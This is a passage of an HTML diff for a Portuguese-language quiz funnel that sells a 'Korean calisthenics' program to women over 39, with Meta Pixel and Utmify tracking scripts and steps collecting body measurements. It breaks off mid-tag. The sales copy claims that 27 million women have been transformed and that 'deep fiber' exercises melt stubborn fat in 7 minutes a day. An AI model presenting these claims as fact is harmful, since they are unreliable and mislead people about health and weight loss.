+    cursor: pointer;
+}
+.vsl-poster {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-size: cover;
+    background-position: center;
+    z-index: 1;
+}
+.vsl-real-video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+/* VTURB SPECIFIC OVERLAYS */
+.vturb-pause-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(139, 0, 0, 0.95); /* Burgundy escuro do VTURB */
+    z-index: 5;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    text-align: center;
+}
+.vturb-pause-overlay.active {
+    display: flex;
+}
+.vturb-overlay-content {
+    max-width: 90%;
+}
+.vturb-overlay-title {
+    color: #ffffff;
+    font-size: 16px;
+    font-weight: 600;
+    margin-bottom: 18px;
+    line-height: 1.4;
+}
+.vturb-overlay-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+.vturb-btn-action {
+    background-color: #ffffff;
+    color: #8b0000;
+    border: none;
+    border-radius: 8px;
+    padding: 12px 18px;
+    font-family: var(--font-family);
+    font-size: 13px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: transform 0.1s;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+}
+.vturb-btn-action.secondary {
+    background-color: rgba(255,255,255,0.15);
+    color: #ffffff;
+    border: 1px solid rgba(255,255,255,0.3);
+}
+.vturb-btn-action:active {
+    transform: scale(0.97);
+}
+.vsl-controls {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: linear-gradient(transparent, rgba(0,0,0,0.6));
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    z-index: 3;
+    opacity: 0.8;
+}
+.vsl-play-pause-btn {
+    background: none;
+    border: none;
+    color: #ffffff;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.vsl-sound-warning {
+    color: #ffffff;
+    font-size: 11px;
+    font-weight: 500;
+}
+/* CTA BUTTON */
+.vsl-cta-container {
+    animation: pulseCTA 2s infinite ease-in-out;
+}
+.btn-cta-buy {
+    font-size: 14px;
+    letter-spacing: 0.5px;
+    display: inline-block;
+    text-decoration: none;
+    text-align: center;
+    box-shadow: 0 6px 20px rgba(91, 107, 214, 0.4);
+}
+.cta-subtext {
+    font-size: 11px;
+    color: var(--text-secondary);
+}
+@keyframes pulseCTA {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.02); }
+    100% { transform: scale(1); }
+}
+/* RESPONSIVE LAYOUT adjustments */
+@media (max-width: 480px) {
+    body {
+        background-color: var(--card-bg);
+    }
+    .quiz-container {
+        box-shadow: none;
+        padding: 16px 14px;
+    }
+    .step-title {
+        font-size: 18px;
+    }
+    .split-layout {
+        flex-direction: column-reverse;
+        align-items: center;
+    }
+    .side-image-container {
+        width: 100%;
+        max-width: 250px;
+        margin-bottom: 15px;
+    }
+    .options-grid-mini {
+        gap: 8px;
+    }
+}
+</style>
+    <!-- Script de Rastreamento do Facebook Pixel (Configurável) -->
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "6a31bfe2f98894116362ddeb";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1033670955803914');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1033670955803914&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+</head>
+<body>
+    <!-- Header do Quiz (Persistente) -->
+    <header class="quiz-header">
+        <button id="btn-back" class="btn-back" style="visibility: hidden;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        </button>
+        <div class="logo">
+            <span class="logo-bold">CALISTENIA</span>
+            <span class="logo-sub">Coreana</span>
+        </div>
+        <div class="header-placeholder"></div>
+    </header>
+    <!-- Barra de Progresso Superior (Indica o avanço pelas 35 etapas) -->
+    <div class="progress-bar-container">
+        <div id="quiz-progress" class="progress-bar-fill" style="width: 3%;"></div>
+    </div>
+    <!-- Container do Quiz -->
+    <main class="quiz-container">
+        <div id="steps-wrapper">
+            
+           <!-- ETAPA 1 -->
+<div class="step-card active hero-step" id="step-1" data-type="single">
+
+    <p class="step-subtitle text-center text-uppercase">
+        TESTE DE 1 MINUTO
+    </p>
+
+    <h1 class="main-title text-center">
+        Programa de Calistenia<br>
+        Coreana <span class="color-highlight">para Mulheres</span>
+    </h1>
+
+    <h2 class="step-title text-center">
+        Quantos anos você tem?
+    </h2>
+
+    <div class="options-list hero-options">
+
+        <button class="option-btn" data-value="39-45">
+            39 – 45 <span class="arrow">→</span>
+        </button>
+
+        <button class="option-btn" data-value="46-50">
+            46 – 50 <span class="arrow">→</span>
+        </button>
+
+        <button class="option-btn" data-value="51-60">
+            51 – 60 <span class="arrow">→</span>
+        </button>
+
+        <button class="option-btn" data-value="60+">
+            60+ <span class="arrow">→</span>
+        </button>
+
+    </div>
+
+    <img
+        src="https://i.imgur.com/fswSg60.png"
+        class="hero-model"
+        alt=""
+    >
+
+</div>
+
+<style>
+    .hero-step{
+    position:relative;
+    min-height:820px;
+    overflow:hidden;
+}
+
+.hero-options{
+    width:62%;
+    position:relative;
+    z-index:20;
+}
+
+.hero-model{
+    position:absolute;
+    width:320px;
+    right:-70px;
+    bottom:0;
+    z-index:1;
+    pointer-events:none;
+}
+
+@media(max-width:768px){
+
+    .hero-step{
+        min-height:700px;
+    }
+
+    .hero-options{
+        width:60%;
+    }
+
+    .hero-model{
+        width:450px;
+        right:-160px;
+        bottom:60px;
+    }
+
+}
+</style>
+
+<!-- ETAPA 2 -->
+<div class="step-card" id="step-2" data-type="info">
+
+    <div class="step-image-container text-center rounded-img-container">
+        <img
+            src="https://i.imgur.com/2kUuqPG.jpeg"
+            class="banner-img"
+            alt=""
+        >
+    </div>
+
+    <h2 class="step-title text-center mt-3">
+        Elas conseguiram e você também pode
+    </h2>
+
+    <p class="step-text text-center">
+        Mais de 27 milhões de mulheres já transformaram suas vidas com a Calistenia Coreana.
+    </p>
+
+    <div class="action-container mt-4">
+        <button class="btn-primary btn-next">
+            Continuar
+        </button>
+    </div>
+
+</div>
+
+<!-- ETAPA 3 -->
+<div class="step-card etapa3-wrapper" id="step-3" data-type="single">
+
+    <h2 class="step-title text-center">
+        Você já experimentou exercícios <br>de calistenia?
+    </h2>
+
+    <div class="options-list etapa3-options">
+
+        <button class="option-btn" data-value="Sim">
+            Sim
+        </button>
+
+        <button class="option-btn" data-value="Não">
+            Não
+        </button>
+
+    </div>
+
+    <img
+        src="https://i.imgur.com/0wzRdm6.png"
+        class="etapa3-image"
+        alt=""
+    >
+
+</div>
+
+<style>
+.etapa3-wrapper{
+    position:relative;
+    min-height:820px;
+    overflow:hidden;
+}
+
+.etapa3-options{
+    width:60%;
+    position:relative;
+    z-index:20;
+}
+
+.etapa3-image{
+    position:absolute;
+    width:420px;
+    right:-70px;
+    bottom:0;
+    z-index:1;
+    pointer-events:none;
+}
+
+@media(max-width:768px){
+
+    .etapa3-wrapper{
+        min-height:700px;
+    }
+
+    .etapa3-options{
+        width:60%;
+    }
+
+    .etapa3-image{
+        width:650px;
+        right:-230px;
+        bottom:0;
+    }
+
+}
+</style>
+
+            <!-- ETAPA 4 (Informativa): Diferença Calistenia Asiática -->
+            <div class="step-card" id="step-4" data-type="info">
+                <h2 class="step-title text-center">Você já tem a base, mas a Calistenia Coreana é diferente da calistenia comum.</h2>
+                <p class="step-text text-justify mt-3">
+                    Enquanto o método tradicional foca apenas em força externa, nossa técnica ativa as <strong>fibras profundas</strong>, agindo na musculatura interna, onde eliminamos a <strong>gordura mais difícil de queimar</strong> e destravamos o seu metabolismo de forma definitiva.
+                </p>
+                <div class="step-image-container text-center rounded-img-container mt-3">
+                    <img src="https://i.imgur.com/Kxwd0B5.png" alt="Exercício Sofá" class="banner-img">
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 5 (Pergunta): Principal Objetivo -->
+            <div class="step-card" id="step-5" data-type="single">
+                <h2 class="step-title text-center">Qual é seu principal objetivo?</h2>
+                <div class="options-list">
+                    <button class="option-btn-icon" data-value="Perder peso">
+                        <span class="icon-circle">⚖️</span>
+                        <span class="option-label">Perder peso</span>
+                    </button>
+                    <button class="option-btn-icon" data-value="Desenvolver músculos">
+                        <span class="icon-circle">💪</span>
+                        <span class="option-label">Desenvolver músculos</span>
+                    </button>
+                    <button class="option-btn-icon" data-value="Manter o peso e ficar em forma">
+                        <span class="icon-circle">👤</span>
+                        <span class="option-label">Manter o peso e ficar em forma</span>
+                    </button>
+                    <button class="option-btn-icon" data-value="Melhorar a aptidão física">
+                        <span class="icon-circle">⚡</span>
+                        <span class="option-label">Melhorar a aptidão física</span>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 6 (Pergunta - Multi-seleção): O que mais você espera alcançar -->
+            <div class="step-card" id="step-6" data-type="multi">
+                <h2 class="step-title text-center">O que mais você espera alcançar<br> com este plano?</h2>
+                <p class="step-subtitle text-center">Pode escolher várias opções</p>
+                
+                <div class="options-list mt-3">
+                    <div class="option-checkbox" data-value="Aumentar a energia">
+                        <span class="icon-circle">🔋</span>
+                        <span class="option-label">Aumentar a energia</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox" data-value="Melhorar o sono">
+                        <span class="icon-circle">🌙</span>
+                        <span class="option-label">Melhorar o sono</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox" data-value="Reduzir o estresse">
+                        <span class="icon-circle">🧠</span>
+                        <span class="option-label">Reduzir o estresse</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox" data-value="Melhorar a postura e a mobilidade">
+                        <span class="icon-circle">↕️</span>
+                        <span class="option-label">Melhorar a postura e a mobilidade</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox" data-value="Desenvolver flexibilidade">
+                        <span class="icon-circle">✨</span>
+                        <span class="option-label">Desenvolver flexibilidade</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next-multi" disabled>Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 7 (Pergunta - Multi-seleção): Zonas de preocupação -->
+            <div class="step-card" id="step-7" data-type="multi" data-special="body-parts">
+                <h2 class="step-title text-center">Quais são as zonas que mais a preocupam?</h2>
+                <p class="step-subtitle text-center">Por favor, selecione todas as opções aplicáveis</p>
+                
+                <!-- Toggle Corpo Inteiro -->
+                <div class="toggle-container mt-3 mb-3">
+                    <span class="toggle-label">Melhorar o corpo inteiro</span>
+                    <label class="switch">
+                        <input type="checkbox" id="toggle-full-body">
+                        <span class="slider round"></span>
+                    </label>
+                </div>
+                <div class="options-grid-mini">
+                    <div class="option-checkbox-img" data-value="Queixo duplo">
+                        <img src="https://i.imgur.com/aOUiG1k.png" alt="Queixo duplo">
+                        <span class="option-label">Queixo duplo</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Braços flácidos">
+                        <img src="https://i.imgur.com/zJD3jKI.png" alt="Braços flácidos">
+                        <span class="option-label">Braços flácidos</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Seios caídos">
+                        <img src="https://i.imgur.com/LGx7bIK.png" alt="Seios caídos">
+                        <span class="option-label">Seios caídos</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Gordura da barriga">
+                        <img src="https://i.imgur.com/5lkzkeO.png" alt="Gordura da barriga">
+                        <span class="option-label">Gordura da barriga</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Gordura nos joelhos">
+                        <img src="https://i.imgur.com/XJa5x6c.png" alt="Gordura nos joelhos">
+                        <span class="option-label">Gordura nos joelhos</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Traseiro de alforje">
+                        <img src="https://i.imgur.com/sDelzpi.png" alt="Traseiro de alforje">
+                        <span class="option-label">Traseiro de alforje</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next-multi" disabled>Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 8 (Pergunta - Multi-seleção): Zonas Alvo -->
+            <div class="step-card" id="step-8" data-type="multi">
+                <h2 class="step-title text-center">Quais são as suas zonas alvo?</h2>
+                <p class="step-subtitle text-center">Escolha todas as opções aplicáveis</p>
+                
+                <div class="options-grid-mini mt-3">
+                    <div class="option-checkbox-img" data-value="Barriga">
+                        <img src="https://i.imgur.com/69qdpjB.png" alt="Barriga">
+                        <span class="option-label">Barriga</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Bunda">
+                        <img src="https://i.imgur.com/pOhHe9Q.png" alt="Bunda">
+                        <span class="option-label">Bunda</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Pernas">
+                        <img src="https://i.imgur.com/u1vDPt8.png" alt="Pernas">
+                        <span class="option-label">Pernas</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Peito">
+                        <img src="https://i.imgur.com/P21K6R1.png" alt="Peito">
+                        <span class="option-label">Peito</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Braços">
+                        <img src="https://i.imgur.com/3Enhs1t.png" alt="Braços">
+                        <span class="option-label">Braços</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                    <div class="option-checkbox-img" data-value="Costas">
+                        <img src="https://i.imgur.com/l5evgXc.png" alt="Costas">
+                        <span class="option-label">Costas</span>
+                        <span class="checkbox-circle"></span>
+                    </div>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next-multi" disabled>Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 9 (Informativa): 7 Minutos -->
+            <div class="step-card" id="step-9" data-type="info">
+                <div class="step-image-container text-center rounded-img-container">
+                    <img src="https://i.imgur.com/YmHwPdT.png" alt="Mulher feliz" class="banner-img">
+                </div>
+                <h2 class="step-title text-center mt-3">Apenas 7 minutos por dia <br>transformarão seu corpo e destravarão <br>o seu metabolismo sem o esforço<br> exaustivo da academia!</h2>
+                <p class="step-text text-justify mt-2">
+                    O Protocolo de Calistenia Coreana utiliza ativações de fibras profundas para derreter a gordura acumulada e chapar a barriga, agindo onde os exercícios comuns de academia não conseguem chegar, de forma simples e definitiva...
+                </p>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 10 (Pergunta): Descrever corpo atual -->
+            <div class="step-card" id="step-10" data-type="single">
+                <h2 class="step-title text-center">Como você descreveria o seu <br>corpo atualmente?</h2>
+                <div class="options-grid-2x2 mt-3">
+                    <button class="option-grid-btn" data-value="Magra">
+                        <img src="https://i.imgur.com/wKj8D0G.png" alt="Magra">
+                        <span class="grid-label">Magra</span>
+                    </button>
+                    <button class="option-grid-btn" data-value="Falsa Magra">
+                        <img src="https://i.imgur.com/3V0PJeg.png" alt="Falsa Magra">
+                        <span class="grid-label">Falsa Magra</span>
+                    </button>
+                    <button class="option-grid-btn" data-value="Acima do peso">
+                        <img src="https://i.imgur.com/JuS3HVU.png" alt="Acima do peso">
+                        <span class="grid-label">Acima do peso</span>
+                    </button>
+                    <button class="option-grid-btn" data-value="Sobrepeso">
+                        <img src="https://i.imgur.com/MMripA3.png" alt="Sobrepeso">
+                        <span class="grid-label">Sobrepeso</span>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 11 (Pergunta): Corpo dos sonhos -->
+            <div class="step-card" id="step-11" data-type="single">
+                <h2 class="step-title text-center">Qual é o corpo dos seus sonhos?</h2>
+                <div class="options-list mt-3">
+                    <button class="option-row-img-btn" data-value="Curvado">
+                        <img src="https://i.imgur.com/bnqs1Bs.png" alt="Curvado">
+                        <span class="row-label">Curvado</span>
+                        <span class="row-arrow">→</span>
+                    </button>
+                    <button class="option-row-img-btn" data-value="Magro">
+                        <img src="https://i.imgur.com/ELfQ09G.png" alt="Magro">
+                        <span class="row-label">Magro</span>
+                        <span class="row-arrow">→</span>
+                    </button>
+                    <button class="option-row-img-btn" data-value="Em forma">
+                        <img src="https://i.imgur.com/lu01odW.png" alt="Em forma">
+                        <span class="row-label">Em forma</span>
+                        <span class="row-arrow">→</span>
+                    </button>
+                    <button class="option-row-img-btn" data-value="Tonificado">
+                        <img src="https://i.imgur.com/dhvEwqt.png" alt="Tonificado">
+                        <span class="row-label">Tonificado</span>
+                        <span class="row-arrow">→</span>
+                    </button>
+                    <button class="option-row-img-btn" data-value="Estou bem com meu corpo">
+                        <img src="https://i.imgur.com/6iRAgX9.png" alt="Estou bem">
+                        <span class="row-label">Estou bem com meu corpo</span>
+                        <span class="row-arrow">→</span>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 12 (Pergunta): Melhor forma da vida -->
+<div class="step-card etapa12-wrapper" id="step-12" data-type="single">
+
+    <h2 class="step-title text-center">
+        Há quanto tempo você estava na melhor forma da sua vida?
+    </h2>
+
+    <div class="options-list etapa12-options">
+
+        <button class="option-btn" data-value="1 a 2 anos atrás">
+            1 a 2 anos atrás
+        </button>
+
+        <button class="option-btn" data-value="3 a 5 anos atrás">
+            3 a 5 anos atrás
+        </button>
+
+        <button class="option-btn" data-value="Mais de 5 anos atrás">
+            Mais de 5 anos atrás
+        </button>
+
+        <button class="option-btn" data-value="Nunca">
+            Nunca
+        </button>
+
+    </div>
+
+    <img
+        src="https://i.imgur.com/hsqTZxW.png"
+        class="etapa12-image"
+        alt=""
+    >
+
+</div>
+
+<style>
+/* ========================= */
+/* ETAPA 12 */
+/* ========================= */
+
+.etapa12-wrapper{
+    position:relative;
+    min-height:820px;
+    overflow:hidden;
+}
+
+.etapa12-options{
+    width:55%;
+    position:relative;
+    z-index:20;
+}
+
+.etapa12-image{
+    position:absolute;
+    width:470px;
+    right:-80px;
+    top:180px; /* sobe a mulher */
+    z-index:1;
+    pointer-events:none;
+}
+
+@media(max-width:768px){
+
+    .etapa12-wrapper{
+        min-height:820px;
+    }
+
+    .etapa12-options{
+        width:50%;
+    }
+
+    .etapa12-image{
+        position:absolute;
+        width:650px;
+        right:-230px;
+        top:160px; /* sobe a mulher no mobile */
+        z-index:1;
+        pointer-events:none;
+    }
+
+}
+</style>
+            <!-- ETAPA 13 (Pergunta - Multi-seleção): Dificuldades -->
+<div class="step-card" id="step-13" data-type="multi" data-special="none-above">
+
+    <h2 class="step-title text-center">
+        Você tem dificuldades com algum dos seguintes itens?
+    </h2>
+
+    <p class="step-subtitle text-center">
+        Por favor, selecione todas as opções aplicáveis
+    </p>
+
+    <div class="options-list mt-3">
+
+        <div class="option-checkbox-img-row" data-value="Costas sensíveis">
+            <span class="icon-circle">
+                <img src="https://i.imgur.com/IDQo3nY.png" alt="Costas">
+            </span>
+            <span class="option-label">Costas sensíveis</span>
+            <span class="checkbox-circle"></span>
+        </div>
+
+        <div class="option-checkbox-img-row" data-value="Joelhos sensíveis">
+            <span class="icon-circle">
+                <img src="https://i.imgur.com/WWsIyDE.png" alt="Joelho">
+            </span>
+            <span class="option-label">Joelhos sensíveis</span>
+            <span class="checkbox-circle"></span>
+        </div>
+
+        <div class="option-checkbox-img-row" data-value="Quadril sensível">
+            <span class="icon-circle">
+                <img src="https://i.imgur.com/QWM2V5Q.png" alt="Quadril">
+            </span>
+            <span class="option-label">Quadril sensível</span>
+            <span class="checkbox-circle"></span>
+        </div>
+
+        <div class="option-checkbox-img-row" data-value="Ombros e braços">
+            <span class="icon-circle">
+                <img src="https://i.imgur.com/SAXmVwj.png" alt="Ombro">
+            </span>
+            <span class="option-label">Ombros e braços</span>
+            <span class="checkbox-circle"></span>
+        </div>
+
+        <div class="option-checkbox-img-row" data-value="Panturrilhas e tornozelos">
+            <span class="icon-circle">
+                <img src="https://i.imgur.com/3BZcRKl.png" alt="Panturrilha">
+            </span>
+            <span class="option-label">Panturrilhas e tornozelos</span>
+            <span class="checkbox-circle"></span>
+        </div>
+
+        <div class="option-checkbox-img-row special-none-option" data-value="Nenhuma das opções acima">
+
+            <span class="option-label">Nenhuma das opções acima</span>
+            <span class="checkbox-circle"></span>
+        </div>
+
+    </div>
+
+    <div class="action-container mt-4">
+        <button class="btn-primary btn-next-multi" disabled>
+            Próximo passo
+        </button>
+    </div>
+
+</div>
+
+<style>
+.icon-circle{
+    width:48px;
+    height:48px;
+    border-radius:12px;
+    overflow:hidden;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+
+    background:#f5f5f5;
+}
+
+.icon-circle img{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    display:block;
+}
+</style>
+            <!-- ETAPA 14 (Pergunta): Confortável ao se exercitar -->
+            <div class="step-card" id="step-14" data-type="single" data-leads-to-conditional="true">
+                <h2 class="step-title text-center">Você se sente confortável<br> ao se exercitar?</h2>
+                <div class="options-list mt-3">
+                    <button class="option-btn-emoji" data-value="Dor/Desconforto">
+                        <span class="emoji-large">😔</span>
+                        <span class="option-label-vertical">Sinto dor/Desconforto</span>
+                    </button>
+                    <button class="option-btn-emoji" data-value="Dificuldade">
+                        <span class="emoji-large">😳</span>
+                        <span class="option-label-vertical">Sinto alguma dificuldade</span>
+                    </button>
+                    <button class="option-btn-emoji" data-value="Confortável">
+                        <span class="emoji-large">😊</span>
+                        <span class="option-label-vertical">Sinto-me confortável</span>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 15 (Informativa): Nós cuidamos de você -->
+            <div class="step-card" id="step-15" data-type="info">
+                <div class="step-image-container text-center rounded-img-container">
+                    <img src="https://i.imgur.com/wIwNWn6.png" alt="Mulher sorrindo" class="banner-img">
+                </div>
+                <h2 class="step-title text-center mt-3">Nós cuidamos de você!</h2>
+                <p class="step-text text-center mt-2">
+                    A dor não vai te impedir. Adaptaremos seu programa <br>para promover movimentos seguros e suaves.
+                </p>
+                <div class="action-container mt-4">
+                    <button class="btn-primary btn-next">Continuar</button>
+                </div>
+            </div>
+            <!-- ETAPA 16 (Interativa): Altura -->
+            <div class="step-card" id="step-16" data-type="ruler" data-measure="height">
+                <h2 class="step-title text-center">Qual é a sua altura?</h2>
+                
+                <!-- Unit Switcher -->
+                <div class="unit-toggle mt-3">
+                    <button class="btn-unit active" data-unit="cm">cm</button>
+                    <button class="btn-unit" data-unit="pol">pol</button>
+                </div>
+                <!-- Display do Valor -->
+                <div class="value-display mt-4">
+                    <span id="height-value" class="large-value">165</span>
+                    <span id="height-unit" class="small-unit">cm</span>
+                </div>
+                <!-- Régua Deslizante Horizontal -->
+                <div class="ruler-outer mt-3">
+                    <div class="ruler-line-indicator"></div>
+                    <div class="ruler-scroll-container" id="height-ruler-container">
+                        <div class="ruler-track" id="height-ruler-track">
+                            <!-- Traços da régua gerados via JS -->
+                        </div>
+                    </div>
+                </div>
+                <p class="drag-tip text-center">Arrastar para ajustar</p>
+                <!-- Status de Cálculo IMC (Placeholder animado) -->
+                <div class="imc-calc-box mt-3">
+                    <span class="info-icon">i</span>
+                    <span class="imc-calc-text">Calculando seu IMC</span>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary" id="btn-next-height">Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 17 (Interativa): Peso Atual -->
+            <div class="step-card" id="step-17" data-type="ruler" data-measure="weight">
+                <h2 class="step-title text-center">Qual é o seu peso agora?</h2>
+                
+                <!-- Unit Switcher -->
+                <div class="unit-toggle mt-3">
+                    <button class="btn-unit active" data-unit="kg">kg</button>
+                    <button class="btn-unit" data-unit="lb">Libra</button>
+                </div>
+                <!-- Display do Valor -->
+                <div class="value-display mt-4">
+                    <span id="weight-value" class="large-value">73</span>
+                    <span id="weight-unit" class="small-unit">kg</span>
+                </div>
+                <!-- Régua Deslizante Horizontal -->
+                <div class="ruler-outer mt-3">
+                    <div class="ruler-line-indicator"></div>
+                    <div class="ruler-scroll-container" id="weight-ruler-container">
+                        <div class="ruler-track" id="weight-ruler-track">
+                            <!-- Traços da régua gerados via JS -->
+                        </div>
+                    </div>
+                </div>
+                <p class="drag-tip text-center">Arrastar para ajustar</p>
+                <!-- Feedback Real de IMC Calculado -->
+                <div class="imc-feedback-box mt-3" id="imc-feedback-p17">
+                    <p class="imc-feedback-text">
+                        Seu IMC é <strong id="imc-val-display">26.81</strong>, que é considerado <strong id="imc-status-display" class="color-highlight">sobrepeso</strong>.
+                        Mantenha-se positivo e concentre-se em uma dieta equilibrada e exercícios.
+                    </p>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary" id="btn-next-weight">Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 18 (Interativa): Peso Alvo -->
+            <div class="step-card" id="step-18" data-type="ruler" data-measure="target-weight">
+                <h2 class="step-title text-center">Qual é o seu peso alvo?</h2>
+                
+                <!-- Unit Switcher -->
+                <div class="unit-toggle mt-3">
+                    <button class="btn-unit active" data-unit="kg">kg</button>
+                    <button class="btn-unit" data-unit="lb">Libra</button>
+                </div>
+                <!-- Display do Valor -->
+                <div class="value-display mt-4">
+                    <span id="target-weight-value" class="large-value">57</span>
+                    <span id="target-weight-unit" class="small-unit">kg</span>
+                </div>
+                <!-- Régua Deslizante Horizontal -->
+                <div class="ruler-outer mt-3">
+                    <div class="ruler-line-indicator"></div>
+                    <div class="ruler-scroll-container" id="target-weight-ruler-container">
+                        <div class="ruler-track" id="target-weight-ruler-track">
+                            <!-- Traços da régua gerados via JS -->
+                        </div>
+                    </div>
+                </div>
+                <p class="drag-tip text-center">Arrastar para ajustar</p>
+                <div class="action-container mt-4">
+                    <button class="btn-primary" id="btn-next-target-weight">Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 19 (Pergunta - Entrada numérica): Idade Real -->
+            <div class="step-card" id="step-19" data-type="input">
+                <h2 class="step-title text-center">Qual é a sua idade?</h2>
+                
+                <div class="input-container mt-4">
+                    <input type="number" id="input-age" placeholder="Digite sua idade" min="10" max="110" class="quiz-input-text">
+                </div>
+                <div class="info-card-box mt-4">
+                    <div class="info-circle-badge">i</div>
+                    <p class="info-card-text">
+                        Perguntamos sua idade para personalizar seu plano. As pessoas mais velhas têm um percentual de gordura corporal mais alto do que as pessoas mais jovens com o mesmo IMC.
+                    </p>
+                </div>
+                <div class="action-container mt-4">
+                    <button class="btn-primary" id="btn-next-age" disabled>Próximo passo</button>
+                </div>
+            </div>
+            <!-- ETAPA 20 (Pergunta): Dia típico -->
+            <div class="step-card" id="step-20" data-type="single">
+                <h2 class="step-title text-center">Como você descreveria seu dia típico?</h2>
+                <div class="options-list mt-3">
+                    <button class="option-row-img-btn" data-value="Sedentário">
+                        <img src="https://i.imgur.com/4ICkuf4.jpeg" alt="Sedentário">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Sedentário</span>
+                            <span class="row-label-sub">Eu passo a maior parte do dia sentado</span>
+                        </div>
+                    </button>
+                    <button class="option-row-img-btn" data-value="Atividade moderada">
+                        <img src="https://i.imgur.com/ozEIGKm.png" alt="Atividade moderada">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Atividade moderada</span>
+                            <span class="row-label-sub">Eu faço pausas ativas</span>
+                        </div>
+                    </button>
+                    <button class="option-row-img-btn" data-value="Eu sou imparável">
+                        <img src="https://i.imgur.com/jSIcm6x.jpeg" alt="Eu sou imparável">
+                        <div class="row-label-container">
+                            <span class="row-label-main">Eu sou imparável</span>
+                            <span class="row-label-sub">Estou de pé o dia todo</span>
+                        </div>
+                    </button>
+                </div>
+            </div>
+            <!-- ETAPA 21 (Pergunta): Níveis de energia -->
+            <div class="step-card" id="step-21" data-type="single">
+                <h2 class="step-title text-center">Como estão seus níveis de<br> energia durante o dia?</h2>
+                <div class="options-list mt-3">
+                    <button class="option-btn py-3 text-left-align" data-value="Baixo">Baixo, sinto-me cansada durante todo o dia</button>
+                    <button class="option-btn py-3 text-left-align" data-value="Queda pós-almoço">Queda pós-almoço</button>
+                    <button class="option-btn py-3 text-left-align" data-value="Arrastando antes das refeições">Arrastando antes das refeições</button>
+                    <button class="option-btn py-3 text-left-align" data-value="Alto e estável">Alto e estável</button>
+                </div>
+            </div>
+            <!-- ETAPA 22 (Pergunta): Quanto de água bebe -->
+<div class="step-card etapa22-wrapper" id="step-22" data-type="single">
+
+    <h2 class="step-title text-center">
